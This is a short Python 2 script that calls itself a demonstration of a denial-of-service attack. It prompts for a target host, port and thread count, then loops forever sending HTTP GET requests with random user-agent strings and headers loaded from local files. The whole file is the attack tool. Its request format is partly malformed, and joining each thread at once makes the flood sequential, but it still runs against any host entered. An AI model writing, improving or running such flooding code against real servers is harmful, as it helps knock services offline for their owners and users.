#Demonstration of a Denial of service attack.
#Email: khanhnn@pythonvietnam.info
 
import threading
import socket
import random
import sys
 
global headers,UsAg,host,port
 
def UserAgent():
    userAg=[]
    File=open("D:\Code\Python\dos-script-python\UserAgent.txt","r")   #your path
    for line in File:
        userAg.append(line)
    return userAg
 
def TakeDown(host="",port=80):
    try:
        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    except socket.error,msg:
        print"Error:",msg
    else:
        try:
            host=socket.gethostbyname(host)
        except socket.gaierror:
            print"Could not resolve hostname."
            sys.exit()
        else:
            packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(UsAg)+"\n"+headers).encode('utf-8')
            if sock.connect_ex((host,port))==0:
                if sock.sendall(packet)==None:
                    print"Packet sent successfuly!"
                    sock.close()
                else:
                    print"Error while sending!"
                    sys.exit()
 
if __name__=="__main__":
    host=raw_input("Enter host address:")
    port=raw_input("Enter port number:")
    threads=raw_input("Enter number of threads:")
    threads=int(threads)
    port=int(port)
    UsAg=UserAgent()
   
    fp=open("D:\Code\Python\dos-script-python\headers.txt","r")
    headers=fp.read()
    fp.close()
    while True:
        for i in range(threads):
            th=threading.Thread(target=TakeDown,args=(host,port,),name="User-"+str(1))
            th.Daemon=True #thread dies if it exits!
            th.start()
            th.join()#make the attack sequential